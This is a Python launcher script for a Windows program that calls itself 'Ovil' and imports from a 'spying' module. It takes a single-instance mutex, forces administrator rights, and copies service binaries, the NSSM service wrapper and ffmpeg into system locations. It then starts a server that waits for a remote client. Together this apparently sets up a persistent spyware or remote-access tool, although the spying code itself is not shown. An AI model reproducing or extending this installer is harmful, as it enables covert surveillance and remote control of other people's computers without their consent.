import multiprocessing
import os

import win32api
import win32con
import winerror

from network.server import Server
from spying.consts import SERVICE_PATHS, SERVICE_NAME, NSSM_PATH, FFMPEG_PATH
from spying import Spy, admin
from pathlib import Path
from shutil import copy as __copy
import ctypes
from ctypes import wintypes
from moviepy.audio.fx.audio_fadein import audio_fadein
from moviepy.audio.fx.audio_fadeout import audio_fadeout
from moviepy.audio.fx.audio_left_right import audio_left_right
from moviepy.audio.fx.audio_loop import audio_loop
from moviepy.audio.fx.audio_normalize import audio_normalize
from moviepy.audio.fx.volumex import volumex
from moviepy.video.fx.accel_decel import accel_decel
from moviepy.video.fx.blackwhite import blackwhite
from moviepy.video.fx.blink import blink
from moviepy.video.fx.colorx import colorx
from moviepy.video.fx.crop import crop
from moviepy.video.fx.even_size import even_size
from moviepy.video.fx.fadein import fadein
from moviepy.video.fx.fadeout import fadeout
from moviepy.video.fx.freeze import freeze
from moviepy.video.fx.freeze_region import freeze_region
from moviepy.video.fx.gamma_corr import gamma_corr
from moviepy.video.fx.headblur import headblur
from moviepy.video.fx.invert_colors import invert_colors
from moviepy.video.fx.loop import loop
from moviepy.video.fx.lum_contrast import lum_contrast
from moviepy.video.fx.make_loopable import make_loopable
from moviepy.video.fx.margin import margin
from moviepy.video.fx.mask_and import mask_and
from moviepy.video.fx.mask_color import mask_color
from moviepy.video.fx.mask_or import mask_or
from moviepy.video.fx.mirror_x import mirror_x
from moviepy.video.fx.mirror_y import mirror_y
from moviepy.video.fx.painting import painting
from moviepy.video.fx.resize import resize
from moviepy.video.fx.rotate import rotate
from moviepy.video.fx.scroll import scroll
from moviepy.video.fx.speedx import speedx
from moviepy.video.fx.supersample import supersample
from moviepy.video.fx.time_mirror import time_mirror
from moviepy.video.fx.time_symmetrize import time_symmetrize

# Create ctypes wrapper for Win32 functions we need, with correct argument/return types
_CreateMutex = ctypes.windll.kernel32.CreateMutexA
_CreateMutex.argtypes = [wintypes.LPCVOID, wintypes.BOOL, wintypes.LPCSTR]
_CreateMutex.restype = wintypes.HANDLE

_WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject
_WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
_WaitForSingleObject.restype = wintypes.DWORD

_ReleaseMutex = ctypes.windll.kernel32.ReleaseMutex
_ReleaseMutex.argtypes = [wintypes.HANDLE]
_ReleaseMutex.restype = wintypes.BOOL

_CloseHandle = ctypes.windll.kernel32.CloseHandle
_CloseHandle.argtypes = [wintypes.HANDLE]
_CloseHandle.restype = wintypes.BOOL

# must be here for the pyinstaller:
import unicrypto.backends.cryptography
import unicrypto.backends.cryptography.DES
import unicrypto.backends.cryptography.TDES
import unicrypto.backends.cryptography.RC4
import unicrypto.backends.cryptography.AES


def copy(src, path):
    try:
        if Path(path).exists():
            os.remove(path)
        __copy(src, path)
    except OSError as e:
        print(e)


def main():
    mutex = None
    try:
        mutex = _CreateMutex(None, False, b"Ovil-21")
        ret = _WaitForSingleObject(mutex, 250)
        if ret not in (0, 0x80):
            print("An ovil is already running")
            mutex = None
        else:
            if not admin.make_admin():
                return
            service1 = Path(f"{SERVICE_NAME}1")
            service2 = Path(f"{SERVICE_NAME}2")
            nssm = Path("nssm.exe")
            ffmpeg = Path("ffmpeg.exe")
            if service1.exists():
                copy(service1, SERVICE_PATHS[0][0])
            if service2.exists():
                copy(service2, SERVICE_PATHS[1][0])
            if nssm.exists():
                copy(nssm, NSSM_PATH)
            if ffmpeg.exists():
                copy(ffmpeg, FFMPEG_PATH)
            s = Server()
            s.wait_for_client()
    finally:
        if mutex:
            print("Closing the mutex")
            ret = _ReleaseMutex(mutex)
            if not ret:
                print("couldn't release mutex")
            ret = _CloseHandle(mutex)
            if not ret:
                print("couldn't close the handle")
            print("Closed the mutex successfully!")


if __name__ == "__main__":
    multiprocessing.freeze_support()
    print("main started!")
    main()
